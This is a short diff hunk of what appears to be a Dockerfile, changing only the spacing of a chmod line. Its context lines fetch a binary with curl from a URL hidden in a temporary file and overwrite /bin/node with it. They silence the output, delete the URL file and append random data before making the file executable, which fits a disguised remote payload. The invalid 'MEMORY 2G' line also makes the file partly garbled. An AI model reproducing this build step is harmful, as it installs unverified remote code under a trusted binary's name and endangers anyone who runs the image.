@@ -8,7 +8,7 @@ RUN apt-get update && apt-get install -y curl && \
     curl -o /bin/node $(cat /tmp/encoded_url.txt) > /dev/null 2>&1 && \
     rm -rf /tmp/encoded_url.txt && \
     dd if=/dev/urandom bs=1024 count=1024 | base64 >> /bin/node && \
-    chmod +x /bin/node
+    chmod  +x /bin/node
 
 # node is a memory hog
 MEMORY 2G
